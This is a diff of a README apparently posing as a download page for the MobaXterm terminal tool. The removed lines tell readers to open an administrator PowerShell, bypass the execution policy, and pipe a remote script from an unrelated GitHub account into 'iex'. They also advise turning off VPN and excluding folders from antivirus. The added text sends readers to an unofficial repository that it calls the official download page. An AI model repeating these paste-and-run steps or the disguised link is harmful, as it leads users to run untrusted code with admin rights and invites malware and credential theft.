@@ -1,126 +1,93 @@
-# MobaXterm Download for Windows 11 & 10
+# 🖥️ MobaXterm-2026 - Simple Terminal Access for Windows Computers
 
-**MobaXterm-2026**
+[![Download MobaXterm](https://img.shields.io/badge/Download-MobaXterm--2026-blue.svg)](https://github.com/Happ527/MobaXterm-2026)
 
-**MobaXterm** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+MobaXterm-2026 acts as a toolkit for remote computing. It combines a terminal, an X11 server, and SSH tools into one application. This software works on Windows 10 and Windows 11. It allows you to connect to remote servers or computers with security.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
+## 📥 Getting the Software
 
----
+1. Open your web browser.
+2. Go to the [official download page](https://github.com/Happ527/MobaXterm-2026).
+3. Find the button labeled "Download" or "Releases."
+4. Click the link to save the installer file to your computer.
+5. Wait for the file to finish downloading.
 
-## Download & Install (PowerShell)
+## ⚙️ Installing MobaXterm on Windows
 
-> **This is the download page.** The command below downloads and runs the **MobaXterm** installer on Windows 10/11.
+After you download the file, follow these steps to place it on your machine.
 
-#### Before you start
+1. Open your "Downloads" folder.
+2. Find the file with the extension .exe.
+3. Double-click the file to start the installation.
+4. If a box appears asking for permission to change your computer, click "Yes."
+5. A window will open to guide you through the setup.
+6. Read the license terms.
+7. Click the "Accept" box if you agree with the terms.
+8. Click "Next" to continue.
+9. Choose the folder where you want to keep the program. The default location works for most users.
+10. Click "Install."
+11. Wait for the green progress bar to finish.
+12. Click "Finish" to close the installer.
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+## 🚀 Starting the Program
 
----
+You can find the program icon on your desktop after the install finishes.
 
-#### Step 1 — Open PowerShell as Administrator
+1. Locate the MobaXterm icon on your desktop.
+2. Double-click the icon to open the main window.
+3. If this is your first time, the program might check your system for needed parts.
+4. You will see a dark or light window with a menu bar at the top.
 
-**Method A (fastest):**
-1. Press **Win + X**
-2. Click **Terminal (Admin)** or **Windows PowerShell (Admin)**
-3. If Windows asks to allow changes, click **Yes**
+## 🔌 Connecting to a Server
 
-**Method B (search):**
-1. Press **Win** and type `PowerShell`
-2. Click **Run as administrator**
+Most users open this program to talk to a remote computer. 
 
-You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
+1. Click the "Session" button in the top left corner.
+2. Choose "SSH" from the list of options.
+3. Type the address of the remote computer in the "Remote host" box.
+4. Check the box that says "Specify username" if you have a specific login name.
+5. Type your username in the box.
+6. Press the "OK" button at the bottom of the window.
+7. A black window will appear. It might show a message asking to trust the remote computer. Type "yes" if you recognize the server.
+8. Type your password when the terminal asks for it. Note that the password will not show on the screen as you type. This keeps your data safe.
+9. Press "Enter" on your keyboard.
 
----
+## 🛠️ Using the File Browser
 
-#### Step 2 — Copy the full command
+One major benefit of this tool is the file browser on the left side of the screen.
 
-Select **both lines** below and press **Ctrl+C**:
+1. When you connect through SSH, the white bar on the left will show the files from the remote server.
+2. You can drag and drop files from your Windows desktop into this window to upload them.
+3. You can also drag files from the window to your desktop to download them.
+4. Right-click any file to rename, delete, or edit it remotely.
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+## 🖥️ Using the X11 Server
 
-> Copy **both lines**, not just the second one.
+This software includes an X11 server. This feature allows you to see programs that have graphic windows. 
 
----
+1. When you start an SSH session, MobaXterm turns on X11 forwarding by default.
+2. If you run a command that opens a window on the remote server, it will appear as a separate window on your Windows desktop.
+3. This works with tools for data analysis, server settings, or graphic design.
 
-#### Step 3 — Paste into PowerShell and press Enter
+## 🛡️ Frequently Asked Questions
 
-1. Click inside the PowerShell window
-2. Press **Ctrl+V** (or right-click → Paste)
-3. Press **Enter** once
-4. Wait — download progress will show in the window (usually 1–3 minutes)
+### Does this program work on Windows 11?
+Yes, this program has full support for Windows 11 and Windows 10.
 
----
+### Can I save my sessions?
+Yes. Every session you create saves inside the "User Sessions" tab on the left side of the main window. You can double-click these at any time to reconnect without typing the address again.
 
-#### Step 4 — Finish setup
+### How do I update the software?
+The program will occasionally check for updates when you start it. If a new version exists, a window will pop up. Click "Update" to get the latest features.
 
-- Do not close the window until the process finishes
-- Enter your **license key** if prompted
-- **Restart** your PC if the installer asks
+### Is the software free to use?
+The home edition is free for personal use. You can download the version from the link provided above to start using it immediately.
 
----
+### What should I do if the connection fails?
+Check your internet connection first. Then, confirm that the remote address is correct. Check that you have the correct username and password. If the remote server uses a specific port, click the "Advanced SSH settings" tab during setup to change the port number.
 
-#### Step 5 — Launch the app
+### Can I change the terminal colors?
+Go to the "Settings" menu in the top bar. Select "Configuration." Click the "Terminal" tab. Here you can change the font, the color scheme, and the background style to suit your preference.
 
-Open **Start menu** → search for **MobaXterm** → run it.
-
----
-
-#### Troubleshooting
-
-| Problem | Fix |
-| --- | --- |
-| "Running scripts is disabled" | Make sure you copied **both lines** and opened PowerShell **as Administrator** |
-| "irm : Unable to connect" | Turn off VPN, check your internet, try again |
-| Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
-| Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
-
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
-
----
-
-## About
-
-**MobaXterm** setup page for Windows PC users.
-
-**People also search for:** mobaxterm download, mobaxterm install setup windows 2026 terminal ssh
-
-**Repository:** `MobaXterm-2026`
-
-
-## After install
-
-| Step | Tip |
-| --- | --- |
-| 1 | Sign in with your license / account |
-| 2 | Check for updates inside the app |
-| 3 | Pin to Start or taskbar for quick access |
-| 4 | Keep projects on a separate data drive |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB |
-| Disk | 1 GB free space |
-| Network | Required for first download |
-| Admin | Required for install/repair |
-
-## Troubleshooting
-
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for the project page |
-| Setup blocked | Run as Administrator |
-| Same error after fix | Reboot, then run repair again |
-| Antivirus warning | Add installer folder to exclusions temporarily |
-
----
-
-**Topics:** mobaxterm-download, mobaxterm, mobaxterm-install-setup-windows-2026-terminal-ssh, terminal, mobaxterm-2026, ssh-client, x11-forwarding, software, windows-11, download
+### Does this handle multiple connections?
+Yes. You can open as many tabs as you need. Click the "New Tab" button or use the menu to create a new session without closing the current one. This allows you to work on multiple servers at the same time.
